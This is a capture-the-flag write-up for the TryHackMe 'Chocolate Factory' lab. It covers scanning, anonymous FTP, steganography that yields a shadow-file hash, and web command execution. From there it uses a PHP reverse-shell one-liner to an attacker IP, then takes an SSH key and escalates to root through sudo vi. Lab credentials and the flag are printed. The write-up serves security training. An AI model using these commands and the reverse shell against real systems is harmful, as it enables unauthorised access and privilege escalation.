# Chocolate Factory
![tryhackme_logo](https://user-images.githubusercontent.com/83867734/185771149-cb02c6f2-8476-4ab3-a626-cca8db0a08bf.png)

Difficulty: **Easy**

Compromise the machine and read the user.txt and root.txt.

Tags
--
* Steganography
* FTP
* SSH
* Sudoers

Tools used
--
* nmap
* ftp
* ssh
* steghide

Machines
--
Attacker:
* Name: attacker_machine
* Operating System: Athena OS
* IP Address: 10.18.98.39

Victim:
* Name: victim_machine
* IP Address: 10.10.222.250
* Other information must be gathered during the attack

## Phase 1: Enumeration
```
sudo nmap -sS -sC -sV 10.10.222.250 -p- -T5 -vvv

<SNIP>
PORT    STATE SERVICE    REASON
21/tcp  open  ftp        syn-ack ttl 63
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.16.123
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh        syn-ack ttl 63
| ssh-hostkey: 
|   2048 1631bbb51fcccc12148ff0d833b0089b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuEAWoQHbW+vehIUZLTiJyXKjUAAJP0sgW/P0LHVaf4C5+1oEBXcDBBZC7SoL6MTMYn8zlEfhCbjQb7A/Yf2IxLzU5f35yuhEbWEvYmuP4PmBB04CJdDItU0xwAbGsufyzZ6td6LKm+oim8xJn/lVTeykVZTASF9iuY9tqwA933AfjqKlNByj82TAmlVkQ93bq+e7Gu/pRkSn++RkIUd4f8ogmLLusEh+vbGkZDj4UdwTIZbOSeuS4oz/umpkJPhekGVoyzjPMRIq9cwdeKIVRwUNbp4BoJjYKjbCC9YY8u/7O6lhtwo4uAp7Q9PfRRCiCpVimm6kIgBmgqqKbueDl
|   256 e71fc9db3eaa44b672103ceedb1d3390 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAYfNs0w6oOdzMM4B2JyB5pWr1qq9oB+xF0Voyn4gBYEGPC9+dqPudYagioH1ArjIHZFF0G24rt7L/6x1OPJSts=
|   256 b44502b6248ea9065f6c79448a06555e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAwurtl1AFxJU7cHOfbCNr34YoTmAVnVUIXt4QHPD1B2
80/tcp  open  http       syn-ack ttl 63
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Site doesn't have a title (text/html).
100/tcp open  newacct    syn-ack ttl 63
101/tcp open  hostname   syn-ack ttl 63
102/tcp open  iso-tsap   syn-ack ttl 63
103/tcp open  gppitnp    syn-ack ttl 63
104/tcp open  acr-nema   syn-ack ttl 63
105/tcp open  csnet-ns   syn-ack ttl 63
106/tcp open  pop3pw     syn-ack ttl 63
107/tcp open  rtelnet    syn-ack ttl 63
108/tcp open  snagas     syn-ack ttl 63
109/tcp open  pop2       syn-ack ttl 63
110/tcp open  pop3       syn-ack ttl 63
111/tcp open  rpcbind    syn-ack ttl 63
112/tcp open  mcidas     syn-ack ttl 63
113/tcp open  ident      syn-ack ttl 63
114/tcp open  audionews  syn-ack ttl 63
115/tcp open  sftp       syn-ack ttl 63
116/tcp open  ansanotify syn-ack ttl 63
117/tcp open  uucp-path  syn-ack ttl 63
118/tcp open  sqlserv    syn-ack ttl 63
119/tcp open  nntp       syn-ack ttl 63
120/tcp open  cfdptkt    syn-ack ttl 63
121/tcp open  erpc       syn-ack ttl 63
122/tcp open  smakynet   syn-ack ttl 63
123/tcp open  ntp        syn-ack ttl 63
|_ntp-info: ERROR: Script execution failed (use -d to debug)
124/tcp open  ansatrader syn-ack ttl 63
125/tcp open  locus-map  syn-ack ttl 63

Host script results:
|_clock-skew: -38665d16h54m30s
<SNIP>
```
We see the FTP allows anonymous login:
```
ftp 10.10.222.250
Connected to 10.10.222.250.
220 (vsFTPd 3.0.3)
Name (10.10.222.250:athena): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> get gum_room.jpg 
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for gum_room.jpg (208838 bytes).
226 Transfer complete.
208838 bytes received in 0.17 seconds (1.17 Mbytes/s)
```
Let's see if something is hidden in the downloaded image:
```
steghide extract -sf gum_room.jpg

Enter passphrase:

steghide: did not write to file "b64.txt".
```
Let's give a look to `b64.txt` that for sure will be a Base64 string:
```
cat b64.txt

daemon:*:18380:0:99999:7:::
bin:*:18380:0:99999:7:::
sys:*:18380:0:99999:7:::
sync:*:18380:0:99999:7:::
games:*:18380:0:99999:7:::
man:*:18380:0:99999:7:::
lp:*:18380:0:99999:7:::
mail:*:18380:0:99999:7:::
news:*:18380:0:99999:7:::
uucp:*:18380:0:99999:7:::
proxy:*:18380:0:99999:7:::
www-data:*:18380:0:99999:7:::
backup:*:18380:0:99999:7:::
list:*:18380:0:99999:7:::
irc:*:18380:0:99999:7:::
gnats:*:18380:0:99999:7:::
nobody:*:18380:0:99999:7:::
systemd-timesync:*:18380:0:99999:7:::
systemd-network:*:18380:0:99999:7:::
systemd-resolve:*:18380:0:99999:7:::
_apt:*:18380:0:99999:7:::
mysql:!:18382:0:99999:7:::
tss:*:18382:0:99999:7:::
shellinabox:*:18382:0:99999:7:::
strongswan:*:18382:0:99999:7:::
ntp:*:18382:0:99999:7:::
messagebus:*:18382:0:99999:7:::
arpwatch:!:18382:0:99999:7:::
Debian-exim:!:18382:0:99999:7:::
uuidd:*:18382:0:99999:7:::
debian-tor:*:18382:0:99999:7:::
redsocks:!:18382:0:99999:7:::
freerad:*:18382:0:99999:7:::
iodine:*:18382:0:99999:7:::
tcpdump:*:18382:0:99999:7:::
miredo:*:18382:0:99999:7:::
dnsmasq:*:18382:0:99999:7:::
redis:*:18382:0:99999:7:::
usbmux:*:18382:0:99999:7:::
rtkit:*:18382:0:99999:7:::
sshd:*:18382:0:99999:7:::
postgres:*:18382:0:99999:7:::
avahi:*:18382:0:99999:7:::
stunnel4:!:18382:0:99999:7:::
sslh:!:18382:0:99999:7:::
nm-openvpn:*:18382:0:99999:7:::
nm-openconnect:*:18382:0:99999:7:::
pulse:*:18382:0:99999:7:::
saned:*:18382:0:99999:7:::
inetsim:*:18382:0:99999:7:::
colord:*:18382:0:99999:7:::
i2psvc:*:18382:0:99999:7:::
dradis:*:18382:0:99999:7:::
beef-xss:*:18382:0:99999:7:::
geoclue:*:18382:0:99999:7:::
lightdm:*:18382:0:99999:7:::
king-phisher:*:18382:0:99999:7:::
systemd-coredump:!!:18396::::::
_rpc:*:18451:0:99999:7:::
statd:*:18451:0:99999:7:::
_gvm:*:18496:0:99999:7:::
charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::
```
Let's crack Charlie hash. Save `$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/` in a file like `hash.txt` and run:
```
hashcat -a 0 -m 1800 hash.txt $ROCKYOU
```
Going ahead, I see that hashcat is not able to crack it, or it is getting a lot of time. Let's try to check the password of Charlie somewhere.

Then, by fuzzing the website by ffuf:
```
ffuf -u http://10.10.222.250/FUZZ.php -w $DIRSMALL

home                    [Status: 200, Size: 569, Words: 29, Lines: 32, Duration: 52ms]
validate                [Status: 200, Size: 93, Words: 2, Lines: 1, Duration: 42ms]
```
By visiting `http://10.10.222.250/home.php`, we can run OS commands by typing them in "Command" field. If we run a `ls` command, we can see a `key_rev_key` file that contains a key to be submitted in the answers. Inside there, we can give a look also to other files, like `validate.php`. If we run `cat` on that file, the browser will interpret it as HTML code. It is better we get a reverse shell. Let's type this command:
```
php -r '$sock=fsockopen("10.8.16.123",4444);exec("sh <&3 >&3 2>&3");'

script /dev/null -c bash
cat validate.php

<?php
	$uname=$_POST['uname'];
	$password=$_POST['password'];
	if($uname=="charlie" && $password=="cn7824"){
		echo "<script>window.location='home.php'</script>";
	}
	else{
		echo "<script>alert('Incorrect Credentials');</script>";
		echo "<script>window.location='index.html'</script>";
	}
```
So, we got the Charlie's password. Using them in the web application, they bring us again to `home.php`. If we come back to it, let's retrieve the content of `/home/charlie/teleport`. It will be the SSH key that we save in a file named `ssh.key` and we use it for connecting by SSH:
```
chmod 600 ssh.key

ssh -i ssh.key 10.10.222.250 -l charlie
```
Now you can connect as Charlie and get the user flag in its home.

Now, privilege escalation. Let's check the sudoers file:
```
cat /etc/sudoers

<SNIP>
charlie ALL=(ALL:!root) NOPASSWD:/usr/bin/vi
<SNIP>
```
We can use the console in VI for running commands as sudo. So, just run `sudo vi` and then execute commands in the VI console:
```
sudo vi

:!cat /root/root.py
Enter the key:-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY= <let's type the key we found at the beginning>
```
Save the content of the Python script in your local machine in a `root.py` and run it:
```
python root.py                
Enter the key:  -VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=
__   __               _               _   _                 _____ _          
\ \ / /__  _   _     / \   _ __ ___  | \ | | _____      __ |_   _| |__   ___ 
 \ V / _ \| | | |   / _ \ | '__/ _ \ |  \| |/ _ \ \ /\ / /   | | | '_ \ / _ \
  | | (_) | |_| |  / ___ \| | |  __/ | |\  | (_) \ V  V /    | | | | | |  __/
  |_|\___/ \__,_| /_/   \_\_|  \___| |_| \_|\___/ \_/\_/     |_| |_| |_|\___|
                                                                             
  ___                              ___   __  
 / _ \__      ___ __   ___ _ __   / _ \ / _| 
| | | \ \ /\ / / '_ \ / _ \ '__| | | | | |_  
| |_| |\ V  V /| | | |  __/ |    | |_| |  _| 
 \___/  \_/\_/ |_| |_|\___|_|     \___/|_|   
                                             

  ____ _                     _       _       
 / ___| |__   ___   ___ ___ | | __ _| |_ ___ 
| |   | '_ \ / _ \ / __/ _ \| |/ _` | __/ _ \
| |___| | | | (_) | (_| (_) | | (_| | ||  __/
 \____|_| |_|\___/ \___\___/|_|\__,_|\__\___|
                                             
 _____          _                    
|  ___|_ _  ___| |_ ___  _ __ _   _  
| |_ / _` |/ __| __/ _ \| '__| | | | 
|  _| (_| | (__| || (_) | |  | |_| | 
|_|  \__,_|\___|\__\___/|_|   \__, | 
                              |___/  

flag{cec59161d338fef787fcb4e296b42124}
```